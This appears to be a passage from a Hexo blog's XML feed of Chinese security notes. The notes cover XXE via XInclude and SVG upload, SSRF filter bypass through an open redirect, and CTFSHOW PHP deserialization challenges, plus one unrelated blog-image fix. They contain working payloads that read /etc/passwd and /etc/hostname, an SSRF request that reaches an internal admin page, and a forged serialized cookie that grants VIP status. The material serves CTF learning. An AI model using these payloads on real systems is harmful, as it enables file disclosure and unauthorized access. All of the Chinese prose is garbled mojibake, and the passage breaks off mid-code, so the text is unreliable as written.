ÊúçÂä°Â§ÑÁêÜÊó∂ÔºåÂ∞±‰ºöÂá∫Áé∞ËøôÁßçÊÉÖÂÜµÁöÑ‰∏Ä‰∏™Á§∫‰æã„ÄÇ</p><p>Âú®ËøôÁßçÊÉÖÂÜµ‰∏ãÔºåÊÇ®Êó†Ê≥ïÊâßË°åÁªèÂÖ∏ÁöÑ XXE ÊîªÂáªÔºåÂõ†‰∏∫ÊÇ®Êó†Ê≥ïÊéßÂà∂Êï¥‰∏™ XML ÊñáÊ°£ÔºåÂõ†Ê≠§Êó†Ê≥ïÂÆö‰πâÊàñ‰øÆÊîπÂÖÉÁ¥†<code>DOCTYPE</code>„ÄÇ‰ΩÜÊòØÔºåÊÇ®‰πüËÆ∏ÂèØ‰ª•ÊîπÁî®<code>XInclude</code>„ÄÇ<code>XInclude</code>ÊòØ XML ËßÑËåÉÁöÑ‰∏ÄÈÉ®ÂàÜÔºåÂÆÉÂÖÅËÆ∏‰ªéÂ≠êÊñáÊ°£ÊûÑÂª∫ XML ÊñáÊ°£„ÄÇÊÇ®ÂèØ‰ª•<code>XInclude</code>Âú® XML ÊñáÊ°£‰∏≠ÁöÑ‰ªª‰ΩïÊï∞ÊçÆÂÄº‰∏≠ËøõË°åÊîªÂáªÔºåÂõ†Ê≠§ÂèØ‰ª•Âú®ÊÇ®‰ªÖÊéßÂà∂ÊîæÁΩÆÂú®ÊúçÂä°Âô®Á´Ø XML ÊñáÊ°£‰∏≠ÁöÑÂçï‰∏™Êï∞ÊçÆÈ°πÁöÑÊÉÖÂÜµ‰∏ãÊâßË°åÊîªÂáª„ÄÇ</p><p>Ë¶ÅÊâßË°å<code>XInclude</code>ÊîªÂáªÔºåÊÇ®ÈúÄË¶ÅÂºïÁî®<code>XInclude</code>ÂëΩÂêçÁ©∫Èó¥Âπ∂Êèê‰æõÊÇ®Â∏åÊúõÂåÖÂê´ÁöÑÊñá‰ª∂ÁöÑË∑ØÂæÑ„ÄÇ‰æãÂ¶ÇÔºö</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>foo</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>xi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XInclude<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">xi:</span>include</span> <span class="token attr-name">parse</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file:///etc/passwd<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>foo</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="ÈÄöËøáÊñá‰ª∂‰∏ä‰º†ËøõË°å-XXE-ÊîªÂáª"><a href="#ÈÄöËøáÊñá‰ª∂‰∏ä‰º†ËøõË°å-XXE-ÊîªÂáª" class="headerlink" title="ÈÄöËøáÊñá‰ª∂‰∏ä‰º†ËøõË°å XXE ÊîªÂáª"></a>ÈÄöËøáÊñá‰ª∂‰∏ä‰º†ËøõË°å XXE ÊîªÂáª</h2><p>‰∏Ä‰∫õÂ∫îÁî®Á®ãÂ∫èÂÖÅËÆ∏Áî®Êà∑‰∏ä‰º†Êñá‰ª∂ÔºåÁÑ∂ÂêéÂú®ÊúçÂä°Âô®Á´ØËøõË°åÂ§ÑÁêÜ„ÄÇ‰∏Ä‰∫õÂ∏∏ËßÅÁöÑÊñá‰ª∂Ê†ºÂºè‰ΩøÁî® XML ÊàñÂåÖÂê´ XML Â≠êÁªÑ‰ª∂„ÄÇÂü∫‰∫é XML ÁöÑÊ†ºÂºèÁöÑÁ§∫‰æãÊòØÂäûÂÖ¨ÊñáÊ°£Ê†ºÂºèÔºàÂ¶Ç DOCXÔºâÂíåÂõæÂÉèÊ†ºÂºèÔºàÂ¶Ç SVGÔºâ„ÄÇ</p><p>‰æãÂ¶ÇÔºåÂ∫îÁî®Á®ãÂ∫èÂèØËÉΩÂÖÅËÆ∏Áî®Êà∑‰∏ä‰º†ÂõæÂÉèÔºåÂπ∂Âú®‰∏ä‰º†ÂêéÂú®ÊúçÂä°Âô®‰∏äÂ§ÑÁêÜÊàñÈ™åËØÅËøô‰∫õÂõæÂÉè„ÄÇÂç≥‰ΩøÂ∫îÁî®Á®ãÂ∫èÂ∏åÊúõÊé•Êî∂ PNG Êàñ JPEG Á≠âÊ†ºÂºèÔºåÊ≠£Âú®‰ΩøÁî®ÁöÑÂõæÂÉèÂ§ÑÁêÜÂ∫ì‰πüÂèØËÉΩÊîØÊåÅ SVG ÂõæÂÉè„ÄÇÁî±‰∫é SVG Ê†ºÂºè‰ΩøÁî® XMLÔºåÊîªÂáªËÄÖÂèØ‰ª•Êèê‰∫§ÊÅ∂ÊÑè SVG ÂõæÂÉèÔºå‰ªéËÄåËææÂà∞ XXE ÊºèÊ¥ûÁöÑÈöêËóèÊîªÂáªÈù¢„ÄÇ</p><p><code>&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot;?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/hostname&quot; &gt; ]&gt;&lt;svg width=&quot;128px&quot; height=&quot;128px&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; version=&quot;1.1&quot;&gt;&lt;text font-size=&quot;16&quot; x=&quot;0&quot; y=&quot;16&quot;&gt;&amp;xxe;&lt;/text&gt;&lt;/svg&gt;</code></p>]]></content>
      
      
      <categories>
          
          <category> Áü•ËØÜÁÇπ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ÈÄöËøáÂºÄÊîæÈáçÂÆöÂêëÁªïËøá SSRF ËøáÊª§Âô®</title>
      <link href="/2023/03/10/%E9%80%9A%E8%BF%87%E5%BC%80%E6%94%BE%E9%87%8D%E5%AE%9A%E5%90%91%E7%BB%95%E8%BF%87-SSRF-%E8%BF%87%E6%BB%A4%E5%99%A8/"/>
      <url>/2023/03/10/%E9%80%9A%E8%BF%87%E5%BC%80%E6%94%BE%E9%87%8D%E5%AE%9A%E5%90%91%E7%BB%95%E8%BF%87-SSRF-%E8%BF%87%E6%BB%A4%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="ÈÄöËøáÂºÄÊîæÈáçÂÆöÂêëÁªïËøá-SSRF-ËøáÊª§Âô®"><a href="#ÈÄöËøáÂºÄÊîæÈáçÂÆöÂêëÁªïËøá-SSRF-ËøáÊª§Âô®" class="headerlink" title="ÈÄöËøáÂºÄÊîæÈáçÂÆöÂêëÁªïËøá SSRF ËøáÊª§Âô®"></a>ÈÄöËøáÂºÄÊîæÈáçÂÆöÂêëÁªïËøá SSRF ËøáÊª§Âô®</h2><p>ÊúâÊó∂ÂèØ‰ª•ÈÄöËøáÂà©Áî®ÂºÄÊîæÈáçÂÆöÂêëÊºèÊ¥ûÊù•ËßÑÈÅø‰ªª‰ΩïÁ±ªÂûãÁöÑÂü∫‰∫éËøáÊª§Âô®ÁöÑÈò≤Âæ°„ÄÇ</p><p>Âú®ÂâçÈù¢ÁöÑ SSRF Á§∫‰æã‰∏≠ÔºåÂÅáËÆæÁî®Êà∑Êèê‰∫§ÁöÑ URL Ë¢´‰∏•Ê†ºÈ™åËØÅ‰ª•Èò≤Ê≠¢ÊÅ∂ÊÑèÂà©Áî® SSRF Ë°å‰∏∫„ÄÇ‰ΩÜÊòØÔºåÂÖÅËÆ∏‰ΩøÁî® URL ÁöÑÂ∫îÁî®Á®ãÂ∫èÂ≠òÂú®ÂºÄÊîæÈáçÂÆöÂêëÊºèÊ¥û„ÄÇÂ¶ÇÊûúÁî®‰∫éÂèëÂá∫ÂêéÁ´Ø HTTP ËØ∑Ê±ÇÁöÑ API ÊîØÊåÅÈáçÂÆöÂêëÔºåÊÇ®ÂèØ‰ª•ÊûÑÂª∫‰∏Ä‰∏™Êª°Ë∂≥ËøáÊª§Âô®ÁöÑ URLÔºåÂπ∂Â∞ÜËØ∑Ê±ÇÈáçÂÆöÂêëÂà∞ÊâÄÈúÄÁöÑÂêéÁ´ØÁõÆÊ†á„ÄÇ</p><p>‰æãÂ¶ÇÔºåÂÅáËÆæÂ∫îÁî®Á®ãÂ∫èÂåÖÂê´‰∏Ä‰∏™ÂºÄÊîæÈáçÂÆöÂêëÊºèÊ¥ûÔºåÂÖ∂‰∏≠ÂåÖÂê´‰ª•‰∏ã URLÔºö</p><blockquote><p>&#x2F;product&#x2F;nextProduct?currentProductId&#x3D;6&amp;path&#x3D;<a href="http://evil-user.net/">http://evil-user.net</a></p><p>ËøîÂõûÈáçÂÆöÂêëÂà∞Ôºö</p></blockquote><blockquote><p><a href="http://evil-user.net/">http://evil-user.net</a></p><p>ÂèØ‰ª•Âà©Áî®ÂºÄÊîæÈáçÂÆöÂêëÊºèÊ¥ûÁªïËøáURLËøáÊª§ÔºåÂà©Áî®SSRFÊºèÊ¥ûÔºåÊñπÊ≥ïÂ¶Ç‰∏ãÔºö</p></blockquote><blockquote><p>POST &#x2F;product&#x2F;stock HTTP&#x2F;1.0<br>Content-Type: application&#x2F;x-www-form-urlencoded<br>Content-Length: 118</p><p>stockApi&#x3D;<a href="http://weliketoshop.net/product/nextProduct?currentProductId=6&amp;path=http://192.168.0.68/admin">http://weliketoshop.net/product/nextProduct?currentProductId=6&amp;path=http://192.168.0.68/admin</a></p></blockquote><p>Ê≠§ SSRF ÊºèÊ¥ûÂà©Áî®‰πãÊâÄ‰ª•ÊúâÊïàÔºåÊòØÂõ†‰∏∫Â∫îÁî®Á®ãÂ∫èÈ¶ñÂÖàÈ™åËØÅÊèê‰æõÁöÑstockAPIURL ÊòØÂê¶‰Ωç‰∫éÂÖÅËÆ∏ÁöÑÂüü‰∏≠ÔºåËÄå‰∫ãÂÆûÁ°ÆÂÆûÂ¶ÇÊ≠§„ÄÇÁÑ∂ÂêéÂ∫îÁî®Á®ãÂ∫èËØ∑Ê±ÇÊèê‰æõÁöÑ URLÔºåËøô‰ºöËß¶ÂèëÊâìÂºÄÈáçÂÆöÂêë„ÄÇÂÆÉÈÅµÂæ™ÈáçÂÆöÂêëÔºåÂπ∂ÂêëÊîªÂáªËÄÖÈÄâÊã©ÁöÑÂÜÖÈÉ® URL ÂèëÂá∫ËØ∑Ê±Ç„ÄÇ</p><p><img src="https://img-blog.csdnimg.cn/b4f66ec9c7e141559dcda56eb0c4d290.png" alt="1"><br>Èöè‰æøÁÇπÂáª‰∏Ä‰∏™ÂïÜÂìÅÊü•ÁúãÔºå<br><img src="https://img-blog.csdnimg.cn/a3dfeecba0264eae985665d931c208dc.png" alt="2"><br>ÂºÄÂêØbpÔºåÊäìÂåÖ„ÄÇ<br><img src="https://img-blog.csdnimg.cn/f9443ac138fa44038a6e14964f76223f.png" alt="2"><br>urlËß£Á†ÅÂêéÂæóÂà∞<br><img src="https://img-blog.csdnimg.cn/b79f6f94ab294bfdba0e2ff7120e77dc.png" alt="3"><br>ÁªßÁª≠ÊäìÂåÖÔºåÁúã‰∏ã‰∏Ä‰∏™‰∫ßÂìÅ„ÄÇ<br><img src="https://img-blog.csdnimg.cn/ca3696e6f3df4d00b88f4ee58d5d8b3a.png" alt="2"><br>Â≠òÂú®ÈáçÂÆöÂêëÔºåÂ§çÂà∂GETÂÜÖÂÆπÔºåÊîæÂà∞stockapiÈáå<br><img src="https://img-blog.csdnimg.cn/e3c347adb82a4416b369238ce4d8689c.png" alt="4"><br>ÊîπpathÔºå<br><img src="https://img-blog.csdnimg.cn/19fc3e9644984ea49b28a1ec8cb0233c.png" alt="5"><br>ÊàêÂäüÂà†Èô§ÔºÅÔºÅ<br><img src="https://img-blog.csdnimg.cn/b151769e345a447eaa8b0fc724cd368e.png" alt="6"></p>]]></content>
      
      
      <categories>
          
          <category> Áü•ËØÜÁÇπ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ËÆ∞‰∏ÄÊ¨°ÂçöÂÆ¢ÁΩëÈ°µÂõæÁâáÂú®ÈÉ®ÁΩ≤ÂêéÊó†Ê≥ïÊòæÁ§∫ÁöÑÈóÆÈ¢ò</title>
      <link href="/2023/03/09/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%8D%9A%E5%AE%A2%E7%BD%91%E9%A1%B5%E5%9B%BE%E7%89%87%E5%9C%A8%E9%83%A8%E7%BD%B2%E5%90%8E%E6%97%A0%E6%B3%95%E6%98%BE%E7%A4%BA%E7%9A%84%E9%97%AE%E9%A2%98/"/>
      <url>/2023/03/09/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%8D%9A%E5%AE%A2%E7%BD%91%E9%A1%B5%E5%9B%BE%E7%89%87%E5%9C%A8%E9%83%A8%E7%BD%B2%E5%90%8E%E6%97%A0%E6%B3%95%E6%98%BE%E7%A4%BA%E7%9A%84%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="ÈóÆÈ¢ò"><a href="#ÈóÆÈ¢ò" class="headerlink" title="ÈóÆÈ¢ò"></a>ÈóÆÈ¢ò</h2><p>ÊàëÂπ≥Â∏∏ÂÜôÂçöÂÆ¢Â∞±ÊòØÂÖàÂú®csdn‰∏äÂÆåÊàêÂêéÂÜçÂ§çÂà∂Á≤òË¥¥Âà∞hexoÂçöÂÆ¢‰∏≠ÔºåËøôÊ†∑ÂÆπÊòìÂºïÂÖ•ÂõæÁâáÔºå‰ªäÂ§©ÈÅáÂà∞‰∏Ä‰∏™ÈóÆÈ¢òÂ∞±ÊòØÂú®ÈÉ®ÁΩ≤ÂêéÂèëÁé∞hexoÂçöÂÆ¢Êó†Ê≥ïÊòæÁ§∫ÂõæÁâá‰∫Ü„ÄÇ</p><h2 id="Ëß£ÂÜ≥ÈóÆÈ¢ò"><a href="#Ëß£ÂÜ≥ÈóÆÈ¢ò" class="headerlink" title="Ëß£ÂÜ≥ÈóÆÈ¢ò"></a>Ëß£ÂÜ≥ÈóÆÈ¢ò</h2><p>ÊñπÊ≥ïÂÖ∂ÂÆûÂæàÁÆÄÂçïÔºåÂè™ÈúÄË¶ÅÊñáÁ´†ÁöÑÂ§¥ÈÉ®Â¶Ç‰∏ãÂõæÊâÄÁ§∫‰ΩçÁΩÆÊ∑ªÂä†Ëøô‰∏ÄÂè•ËØùÂ∞±ÂèØ‰ª•ÂÆåÁæéËß£ÂÜ≥ÈóÆÈ¢ò</p><p><img src="https://img-blog.csdnimg.cn/5616d0a30e614287881b0ae1a13cb8ff.png" alt="2"></p>]]></content>
      
      
      <categories>
          
          <category> ÂçöÂÆ¢ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CTFSHOW-ÂèçÂ∫èÂàóÂåñ</title>
      <link href="/2023/03/08/CTFSHOW-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/03/08/CTFSHOW-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-12-02 17:44:47# @Last Modified by:   h1xa# @Last Modified time: 2020-12-02 19:29:02# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"your flag is "</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip, no flag"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$user</span><span class="token operator">-></span><span class="token function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip,no flag"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>È¶ñÂÖàÂÆö‰πâ‰∏Ä‰∏™Á±ª<strong>ctfShowUser</strong>ÔºåÂàõÂª∫ÂÖ¨ÂÖ±ÂèòÈáè<code>$usernameÔºå$passwordÔºå$isVip</code>„ÄÇ</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$user</span><span class="token operator">-></span><span class="token function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip,no flag"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Â∞ÜcookieÂèçÂ∫èÂàóÂåñÔºåcookieÁî®user‰º†ÂÖ•„ÄÇÊÄª‰ΩìÊÄùË∑Ø‰πüÂ∞±ÊòØGET‰º†ÂÖ•usernameÂíåpasswordÁÑ∂ÂêéÂ∞ÜcookieËøõË°åÂèçÂ∫èÂàóÂåñ„ÄÇÁî±‰∫é<code>public $isVip=false;public function checkVip()&#123;        return $this-&gt;isVip;    &#125;</code>ÔºåÊâÄ‰ª•Ë¶ÅÂ∞ÜcheckvipÂõûÊòæ‰∏∫Áúü„ÄÇÂπ∂‰∏îËé∑ÂæóÂ∞ÜcookieÁöÑuserÂ∫èÂàóÂåñÂêéÁöÑ‰ª£Á†Å„ÄÇ</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ÊâßË°åÁªìÊûú‰∏∫<code>O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</code><br><img src="https://img-blog.csdnimg.cn/232c87cffaf54618987f47609eea9756.png" alt="1"><br><img src="https://img-blog.csdnimg.cn/8ad56eb636804a2d8bb55c4f918fe918.png" alt="2">ÂæóÂà∞flag„ÄÇ</p><h2 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-12-02 17:44:47# @Last Modified by:   h1xa# @Last Modified time: 2020-12-02 19:29:02# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">!==</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"your flag is "</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span>              <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip, no flag"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token 